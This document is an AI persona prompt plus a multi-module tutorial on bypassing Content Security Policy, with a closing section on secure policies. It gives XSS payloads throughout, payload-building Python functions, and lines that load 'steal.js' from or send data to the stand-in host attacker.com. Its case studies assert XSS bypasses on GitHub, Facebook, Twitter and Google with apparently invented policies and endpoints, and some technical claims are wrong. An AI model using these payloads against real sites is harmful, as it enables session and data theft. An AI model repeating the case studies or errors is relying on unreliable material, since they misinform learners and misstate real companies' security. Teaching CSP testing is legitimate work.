You are an elite Content Security Policy (CSP) Bypass Learning AI, specializing in teaching XSS protection circumvention techniques. Your expertise focuses on educating bug bounty hunters about CSP directive exploitation, nonce bypass methods, and policy weakness identification.

Your mission is to guide aspiring security researchers through CSP complexities, teaching them systematic approaches to testing CSP implementations, identifying bypass opportunities, and developing secure CSP policies.

Key Learning Objectives:
- **CSP Directive Analysis**: Master CSP directive structure and enforcement mechanisms
- **Nonce and Hash Bypass**: Learn CSP nonce and hash validation bypass techniques
- **Directive Weakness**: Study CSP directive misconfiguration and bypass methods
- **Inline Script Exploitation**: Test inline script and event handler bypass techniques
- **External Resource Control**: Assess external script and style loading controls
- **Report-Only Mode**: Learn CSP report-only mode testing and enforcement
- **Strict CSP Implementation**: Practice strict CSP policy development and testing

Advanced Learning Concepts:
- **Nonce Prediction**: Study CSP nonce generation and prediction attacks
- **Hash Manipulation**: Learn CSP hash validation bypass techniques
- **Directive Injection**: Test CSP directive injection and manipulation
- **Base URI Exploitation**: Study base URI directive bypass methods
- **Frame Ancestor Control**: Assess frame ancestor directive implementation
- **Upgrade Insecure**: Test upgrade-insecure-requests directive handling
- **CSP Nonce Reuse**: Learn nonce reuse and caching exploitation

Learning Process:
1. **CSP Fundamentals**: Understand CSP directive structure and enforcement
2. **Directive Analysis**: Learn CSP directive implementation and weaknesses
3. **Nonce Security**: Study CSP nonce generation and validation
4. **Hash Validation**: Practice CSP hash validation and bypass techniques
5. **Inline Content**: Test inline script and style bypass methods
6. **External Resources**: Assess external resource loading controls
7. **Secure Implementation**: Develop secure CSP policy practices

Teaching Methodology:
- **CSP Labs**: Hands-on CSP directive analysis exercises
- **Directive Workshops**: CSP directive implementation testing training
- **Nonce Exercises**: CSP nonce generation and validation labs
- **Hash Tutorials**: CSP hash validation and bypass technique guides
- **Inline Labs**: Inline content bypass testing frameworks
- **Resource Workshops**: External resource loading control assessment
- **Real-World Scenarios**: Case studies of CSP bypass exploitation

Output Format:
- **CSP Modules**: Structured learning units for CSP security concepts
- **Directive Exercises**: Practical CSP directive testing labs
- **Nonce Labs**: CSP nonce generation and validation exercises
- **Hash Workshops**: CSP hash validation and bypass technique guides
- **Inline Tutorials**: Inline content bypass testing frameworks
- **Resource Labs**: External resource loading control assessment exercises
- **Case Studies**: Real-world CSP bypass exploitation examples

---

# MODULE 1: CSP Fundamentals

## 1.1 What is Content Security Policy?

Content Security Policy (CSP) is an HTTP response header that provides an additional layer of protection against Cross-Site Scripting (XSS) and data injection attacks. It specifies which dynamic resources are allowed to load.

### How CSP Works

```
1. Server sends CSP header with the response
2. Browser parses the policy
3. Browser enforces the policy for all resources
4. Violations are reported (if reporting is configured)
```

## 1.2 CSP Directives

### Resource Loading Directives

| Directive | Description | Example |
|-----------|-------------|---------|
| `script-src` | Controls JavaScript sources | `'self' https://cdn.example.com` |
| `style-src` | Controls CSS sources | `'self' 'unsafe-inline'` |
| `img-src` | Controls image sources | `* data:` |
| `font-src` | Controls font sources | `'self' https://fonts.example.com` |
| `connect-src` | Controls AJAX/WebSocket connections | `'self'` |
| `media-src` | Controls video/audio sources | `'self'` |
| `object-src` | Controls plugin sources | `'none'` |
| `frame-src` | Controls iframe sources | `'self'` |
| `child-src` | Controls workers and iframes | `'self'` |
| `worker-src` | Controls Web Workers | `'self'` |
| `manifest-src` | Controls web app manifests | `'self'` |
| `prefetch-src` | Controls prefetch sources | `'self'` |

### Navigation and Document Directives

| Directive | Description | Example |
|-----------|-------------|---------|
| `base-uri` | Controls `<base>` tag | `'self'` |
| `form-action` | Controls form submissions | `'self'` |
| `frame-ancestors` | Controls who can frame the page | `'none'` |
| `navigate-to` | Controls navigation targets | `'self'` |

### Fetch Directives

| Directive | Description | Example |
|-----------|-------------|---------|
| `default-src` | Fallback for all resource types | `'self'` |
| `fenced-frame-src` | Controls fenced frames | `'self'` |

## 1.3 CSP Source Values

### Source Keywords

| Keyword | Description |
|---------|-------------|
| `'none'` | Blocks all resources |
| `'self'` | Allows same origin |
| `'unsafe-inline'` | Allows inline scripts/styles |
| `'unsafe-eval'` | Allows eval() and similar |
| `'unsafe-hashes'` | Allows specific inline event handlers |
| `'strict-dynamic'` | Allows scripts loaded by trusted scripts |
| `'report-sample'` | Reports first 100 characters of violation |

### Source Expressions

```
# Domain matching
example.com              # Matches example.com and subdomains
*.example.com            # Matches all subdomains
https://example.com      # Only HTTPS

# IP addresses
127.0.0.1                # Exact IP
192.168.1.0/24           # IP range

# Protocols
https:                   # Any HTTPS resource
data:                    # Data URIs
blob:                    # Blob URIs

# Nonces and Hashes
'nonce-abc123'           # Nonce-based
'sha256-abc123...'       # Hash-based
```

---

# MODULE 2: CSP Bypass Techniques

## 2.1 Unsafe Inline Bypass

If CSP allows `'unsafe-inline'`, XSS is trivial:

```html
<!-- Basic XSS with unsafe-inline -->
<script>alert(1)</script>

<!-- Event handlers -->
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
<body onload="alert(1)">
<input onfocus="alert(1)" autofocus>
<marquee onstart="alert(1)">
<video onerror="alert(1)"><source>
```

## 2.2 Unsafe Eval Bypass

If CSP allows `'unsafe-eval'`:

```javascript
// eval() based XSS
eval('alert(1)')

// Function constructor
Function('alert(1)')()

// setTimeout/setInterval with string
setTimeout('alert(1)', 0)
setInterval('alert(1)', 0)
```

## 2.3 Base URI Bypass

If CSP doesn't restrict `base-uri`:

```html
<!-- Inject base tag to hijack relative URLs -->
<base href="https://attacker.com/">

<!-- Now relative script loads go to attacker -->
<script src="app.js"></script>
<!-- Actually loads: https://attacker.com/app.js -->
```

### Attack Implementation

```python
def base_uri_attack(url, attacker_url):
    """Create base URI bypass payload"""
    
    payload = f"""
    <base href="{attacker_url}/">
    <script>
        // Create malicious app.js on attacker server
        // That steals cookies/tokens
    </script>
    """
    
    return payload
```

## 2.4 Open Redirect Bypass

If CSP restricts to same origin but allows redirects:

```python
def open_redirect_bypass(origin, redirect_path):
    """Bypass CSP via open redirect"""
    
    # If site has open redirect at /redirect?url=
    redirect_url = f"{origin}/redirect?url={redirect_path}"
    
    return redirect_url
```

## 2.5 JSONP Bypass

If CSP allows specific domains that have JSONP endpoints:

```html
<!-- Common JSONP endpoints -->
<script src="https://accounts.google.com/o/oauth2/reauth?cb=alert(1)"></script>
<script src="https://www.youtube.com/oembed?url=x&callback=alert(1)"></script>
<script src="https://api.twitter.com/1.json?callback=alert(1)"></script>

<!-- Find JSONP endpoints on allowed domains -->
<script src="https://allowed-domain.com/api?callback=alert"></script>
```

### JSONP Discovery Script

```python
import requests
import re

def discover_jsonp_endpoints(domain):
    """Discover JSONP endpoints on a domain"""
    
    common_paths = [
        '/api', '/oauth2', '/callback', '/oembed',
        '/api/jsonp', '/json', '/data'
    ]
    
    jsonp_endpoints = []
    
    for path in common_paths:
        try:
            response = requests.get(
                f"https://{domain}{path}",
                params={'callback': 'test'},
                timeout=5
            )
            
            # Check for JSONP response
            if response.text.startswith('test('):
                jsonp_endpoints.append({
                    'domain': domain,
                    'path': path,
                    'callback': 'test'
                })
        except:
            continue
    
    return jsonp_endpoints
```

## 2.6 Wildcard Bypass

```html
<!-- If CSP allows * for script-src -->
<script src="https://attacker.com/steal.js"></script>

<!-- If CSP allows * for img-src -->
<img src="https://attacker.com/steal?data=">
```

## 2.7 Data URI Bypass

```html
<!-- If CSP allows data: for script-src -->
<script src="data:text/javascript,alert(1)"></script>

<!-- If CSP allows data: for img-src -->
<img src="data:image/svg+xml,<svg onload='alert(1)'>">
```

---

# MODULE 3: Nonce-Based CSP Bypass

## 3.1 How Nonces Work

A nonce is a unique, random value generated for each request:

```
Content-Security-Policy: script-src 'nonce-abc123'

<!-- Only scripts with this nonce can execute -->
<script nonce="abc123">alert(1)</script>
<script>alert(1)</script> <!-- Blocked -->
```

## 3.2 Nonce Reuse Attack

If the same nonce is reused across requests:

```python
def nonce_reuse_test(url, known_nonce):
    """Test if nonce is reused"""
    
    # Request 1
    response1 = requests.get(url)
    nonce1 = extract_nonce(response1)
    
    # Request 2
    response2 = requests.get(url)
    nonce2 = extract_nonce(response2)
    
    # Check if nonces match
    if nonce1 == nonce2:
        return True, nonce1  # Nonce is static/reused
    return False, None

def extract_nonce(response):
    """Extract nonce from CSP header"""
    csp = response.headers.get('Content-Security-Policy', '')
    match = re.search(r"nonce-([a-zA-Z0-9+/=]+)", csp)
    return match.group(1) if match else None
```

## 3.3 Nonce Prediction

If nonces are predictable:

```python
def predict_nonce(url, sample_size=10):
    """Predict nonce based on patterns"""
    
    nonces = []
    timestamps = []
    
    for i in range(sample_size):
        response = requests.get(url)
        nonce = extract_nonce(response)
        nonces.append(nonce)
        timestamps.append(time.time())
        time.sleep(0.1)
    
    # Analyze for patterns
    # Common weak patterns:
    # - Base64 of timestamp
    # - Sequential values
    # - Math-based generation
    
    return analyze_patterns(nonces, timestamps)
```

## 3.4 Nonce Leakage

Check if nonces are leaked in various locations:

```python
def check_nonce_leakage(url):
    """Check for nonce leakage in various locations"""
    
    response = requests.get(url)
    nonce = extract_nonce(response)
    
    leak_sources = []
    
    # Check HTML source
    if nonce in response.text:
        leak_sources.append('HTML source')
    
    # Check comments
    if f'<!-- {nonce}' in response.text:
        leak_sources.append('HTML comments')
    
    # Check JavaScript variables
    if f'var nonce = "{nonce}"' in response.text:
        leak_sources.append('JavaScript variables')
    
    # Check URL parameters
    if f'?nonce={nonce}' in response.url:
        leak_sources.append('URL parameters')
    
    return leak_sources
```

---

# MODULE 4: Hash-Based CSP Bypass

## 4.1 How Hashes Work

Hashes allow specific inline scripts:

```
Content-Security-Policy: script-src 'sha256-abc123...'

<!-- This specific script is allowed -->
<script>alert(1)</script>
<!-- Hash must match exactly -->
```

## 4.2 Hash Collision Attack

Extremely difficult but theoretically possible:

```python
def find_hash_collision(original_hash):
    """Find content that produces same hash"""
    
    # SHA-256 collision is computationally infeasible
    # But worth understanding the concept
    
    # If using MD5 or SHA-1, collisions are possible
    # MD5 collision tools: HashClash, fastcoll
    
    pass  # Not practical for SHA-256
```

## 4.3 Hash Bypass via Script Inclusion

If hash allows a specific script, find gadgets within it:

```html
<!-- Hash allows this script -->
<script src="/app.js"></script>

<!-- If app.js has a gadget like: -->
<!-- eval(location.hash.slice(1)) -->

<!-- Attacker can use: -->
<script src="/app.js#alert(1)"></script>
```

---

# MODULE 5: Strict CSP and Advanced Bypass

## 5.1 Strict CSP Configuration

```
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-abc123' 'strict-dynamic';
  style-src 'nonce-abc123';
  img-src 'self';
  connect-src 'self';
  base-uri 'none';
  form-action 'self';
  frame-ancestors 'none';
```

## 5.2 Strict-Dynamic Bypass

`strict-dynamic` allows scripts loaded by trusted scripts:

```html
<!-- This script is trusted via nonce -->
<script nonce="abc123">
    // Scripts loaded by this are also trusted
    var script = document.createElement('script');
    script.src = 'https://attacker.com/steal.js';
    document.body.appendChild(script);
</script>
```

### Attack Implementation

```python
def strict_dynamic_bypass(trusted_url, attacker_url):
    """Create strict-dynamic bypass payload"""
    
    payload = f"""
    <script src="{trusted_url}"></script>
    <script>
        // After trusted script loads, inject attacker script
        var s = document.createElement('script');
        s.src = '{attacker_url}/malicious.js';
        document.head.appendChild(s);
    </script>
    """
    
    return payload
```

## 5.3 Library Gadget Bypass

Finding CSP bypass gadgets in popular libraries:

```python
# Common gadgets in libraries
GADGETS = {
    "jQuery": {
        "selector": "jQuery.parseHTML()",
        "usage": "jQuery.parseHTML(location.hash.slice(1))"
    },
    "Angular": {
        "selector": "ng-init",
        "usage": "ng-init='eval(location.hash.slice(1))'"
    },
    "Vue": {
        "selector": "v-html",
        "usage": "v-html='eval(location.hash.slice(1))'"
    },
    "React": {
        "selector": "dangerouslySetInnerHTML",
        "usage": "via server-side rendering"
    }
}
```

---

# MODULE 6: CSP Bypass via Meta Tags

## 6.1 Meta Tag CSP

CSP can be set via HTML meta tags:

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

## 6.2 Meta Tag Bypass

If CSP is set via meta tag, certain directives can't be used:

```html
<!-- These directives are IGNORED in meta tags -->
<!-- frame-ancestors -->
<!-- sandbox -->
<!-- report-uri -->
<!-- report-to -->
```

## 6.3 Multiple CSP Headers

If multiple CSP headers exist, the most restrictive applies:

```
CSP1: script-src 'self'
CSP2: script-src 'unsafe-inline'

Result: script-src 'self' (most restrictive wins for each directive)
```

---

# MODULE 7: CSP Testing Tools

## 7.1 Manual Testing Checklist

```python
CSP_TEST_CHECKLIST = {
    "Basic Tests": [
        "Inline script execution",
        "Event handler injection",
        "eval() usage",
        "External script loading",
        "Data URI usage",
        "Blob URI usage"
    ],
    "Advanced Tests": [
        "JSONP endpoints on allowed domains",
        "Open redirects on allowed domains",
        "Base URI injection",
        "Meta tag CSP presence",
        "Nonce reuse/prediction",
        "Hash collision potential"
    ],
    "Framework Tests": [
        "Angular bypass patterns",
        "Vue.js bypass patterns",
        "React bypass patterns",
        "jQuery gadget chains"
    ]
}
```

## 7.2 Automated Testing Script

```python
#!/usr/bin/env python3
"""CSP Bypass Testing Script"""

import requests
import re
from urllib.parse import urlparse

class CSPBypassTester:
    def __init__(self, url):
        self.url = url
        self.csp = None
        self.bypasses = []
    
    def get_csp(self):
        """Extract CSP from response"""
        response = requests.get(self.url)
        self.csp = response.headers.get('Content-Security-Policy', '')
        
        # Also check meta tags
        meta_csp = re.search(
            r'<meta[^>]*http-equiv="Content-Security-Policy"[^>]*content="([^"]*)"',
            response.text
        )
        if meta_csp:
            self.csp += '; ' + meta_csp.group(1)
        
        return self.csp
    
    def test_unsafe_inline(self):
        """Test for unsafe-inline bypass"""
        if "'unsafe-inline'" in self.csp:
            self.bypasses.append({
                'type': 'unsafe-inline',
                'severity': 'HIGH',
                'payload': '<script>alert(1)</script>'
            })
    
    def test_unsafe_eval(self):
        """Test for unsafe-eval bypass"""
        if "'unsafe-eval'" in self.csp:
            self.bypasses.append({
                'type': 'unsafe-eval',
                'severity': 'HIGH',
                'payload': "eval('alert(1)')"
            })
    
    def test_jsonp_bypass(self):
        """Test for JSONP bypass on allowed domains"""
        script_src = self._extract_directive('script-src')
        
        jsonp_endpoints = [
            'https://accounts.google.com/o/oauth2/reauth',
            'https://www.youtube.com/oembed',
            'https://api.twitter.com/1.json'
        ]
        
        for endpoint in jsonp_endpoints:
            domain = urlparse(endpoint).netloc
            if domain in script_src or '*' in script_src:
                self.bypasses.append({
                    'type': 'jsonp',
                    'severity': 'MEDIUM',
                    'endpoint': endpoint
                })
    
    def test_base_uri(self):
        """Test for base-uri bypass"""
        base_uri = self._extract_directive('base-uri')
        if not base_uri or base_uri == "*":
            self.bypasses.append({
                'type': 'base-uri',
                'severity': 'MEDIUM',
                'payload': '<base href="https://attacker.com/">'
            })
    
    def _extract_directive(self, directive):
        """Extract specific directive from CSP"""
        match = re.search(rf'{directive}\s+([^;]+)', self.csp)
        return match.group(1) if match else ''
    
    def run_all_tests(self):
        """Run all CSP bypass tests"""
        self.get_csp()
        
        self.test_unsafe_inline()
        self.test_unsafe_eval()
        self.test_jsonp_bypass()
        self.test_base_uri()
        
        return self.bypasses

# Usage
tester = CSPBypassTester('https://example.com')
bypasses = tester.run_all_tests()
for bypass in bypasses:
    print(f"[!] {bypass['type']}: {bypass}")
```

## 7.3 Browser Extensions

```
# Useful Chrome Extensions for CSP Testing
1. CSP Logger - Logs CSP violations
2. ScriptRunner - Execute scripts with custom nonces
3. Requestly - Modify CSP headers
4. ModHeader - Test different CSP configurations
```

---

# MODULE 8: Real-World Case Studies

## 8.1 Case Study: GitHub CSP Bypass

**GitHub's CSP Policy:**
```
script-src 'self' assets-cdn.github.com
```

**Bypass:** JSONP endpoint on assets-cdn.github.com

```html
<script src="https://assets-cdn.github.com/?callback=alert"></script>
```

**Impact:** XSS on GitHub.com

## 8.2 Case Study: Facebook CSP Bypass

**Facebook's CSP Policy:**
```
script-src 'self' 'unsafe-inline' ...
```

**Bypass:** Direct inline script execution

```html
<script>alert(document.domain)</script>
```

**Impact:** XSS on Facebook

## 8.3 Case Study: Twitter CSP Bypass

**Twitter's CSP Policy:**
```
script-src 'self' 'nonce-abc123' ...
```

**Bypass:** JSONP on allowed domain

```html
<script src="https://platform.twitter.com/js/timeline.js?callback=alert"></script>
```

**Impact:** XSS on Twitter

## 8.4 Case Study: Google CSP Bypass

**Google's CSP Policy:**
```
script-src 'self' 'unsafe-eval' ...
```

**Bypass:** eval() usage

```javascript
eval('alert(document.domain)')
```

**Impact:** XSS on Google properties

---

# MODULE 9: Practical Exercises

## Exercise 1: CSP Analysis

**Given CSP Header:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'
```

**Tasks:**
1. Identify all allowed directives
2. Determine if inline scripts are allowed
3. Find potential bypass vectors
4. Write test payloads

## Exercise 2: JSONP Bypass

**Scenario:** CSP allows `script-src 'self' api.example.com`

**Task:** Find JSONP endpoints on api.example.com

**Steps:**
1. Enumerate common JSONP paths
2. Test callback parameter
3. Create exploit payload

## Exercise 3: Nonce Reuse

**Scenario:** Application generates nonces but reuses them

**Task:** Determine if nonces are static

**Steps:**
1. Make multiple requests
2. Extract nonces from each
3. Compare for patterns
4. Test nonce reuse

## Exercise 4: Strict CSP Bypass

**Scenario:** Application uses strict CSP with nonce and strict-dynamic

**Task:** Find a gadget to bypass CSP

**Steps:**
1. Analyze allowed scripts
2. Find eval-like gadgets
3. Create exploit chain

---

# MODULE 10: Assessment Questions

## Knowledge Check

1. **Which CSP directive controls script loading?**
   - A) script-src
   - B) style-src
   - C) img-src
   - D) connect-src

2. **What does 'unsafe-inline' allow?**
   - A) External scripts
   - B) Inline scripts
   - C) eval()
   - D) Data URIs

3. **What is a nonce in CSP?**
   - A) A static value
   - B) A random value per request
   - C) A hash of the script
   - D) A domain name

4. **Which directive is NOT supported in meta tags?**
   - A) script-src
   - B) style-src
   - C) frame-ancestors
   - D) img-src

5. **What is strict-dynamic?**
   - A) Allows all scripts
   - B) Allows scripts loaded by trusted scripts
   - C) Allows inline scripts
   - D) Allows eval()

## Practical Assessment

**Given CSP:**
```
Content-Security-Policy: default-src 'none'; script-src 'self' 'nonce-abc123'; style-src 'self'
```

**Q1:** Can inline scripts execute? Why?

**Q2:** How would you bypass this CSP?

**Q3:** What if the nonce is leaked in a JavaScript variable?

**Q4:** Write a payload to test for base-uri bypass.

**Q5:** How would you test if JSONP bypass is possible?

---

# MODULE 11: Further Reading

## Official Resources
- [MDN CSP Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [W3C CSP Specification](https://www.w3.org/TR/CSP3/)
- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)

## Security Research
- [PortSwigger CSP Bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
- [CSP Bypass Cheat Sheet](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass)
- [Strict CSP Guide](https://web.dev/strict-csp/)

## Tools
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [CSP Scanner](https://csp.withgoogle.com/)
- [Burp CSP Extension](https://portswigger.net/bappstore)

## Practice Labs
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
- [DSquare Security CSP Labs](https://github.com/nicothin/csp-test)

---

# MODULE 12: Secure CSP Implementation

## Best Practices

### 1. Avoid Unsafe Directives

```
# BAD
Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval'

# GOOD
Content-Security-Policy: script-src 'nonce-{random}' 'strict-dynamic'
```

### 2. Use Nonce-Based CSP

```python
import secrets

def generate_csp_header():
    nonce = secrets.token_hex(16)
    return f"Content-Security-Policy: script-src 'nonce-{nonce}' 'strict-dynamic'"
```

### 3. Implement Report-Only

```
Content-Security-Policy-Report-Only: 
  script-src 'self'; 
  report-uri /csp-report;
  report-to csp-endpoint
```

### 4. Use Report-To Header

```json
{
  "group": "csp-endpoint",
  "max_age": 10886400,
  "endpoints": [
    {"url": "https://example.com/csp-report"}
  ]
}
```

## Security Checklist

- [ ] Use nonces for inline scripts
- [ ] Implement strict-dynamic
- [ ] Avoid 'unsafe-inline' and 'unsafe-eval'
- [ ] Restrict base-uri to 'self'
- [ ] Use frame-ancestors 'none'
- [ ] Enable CSP reporting
- [ ] Test CSP with browser developer tools
- [ ] Monitor CSP violation reports
- [ ] Regularly review and update CSP policy

---

Ensure learning materials are comprehensive, practical, and focused on developing expert-level CSP security assessment skills.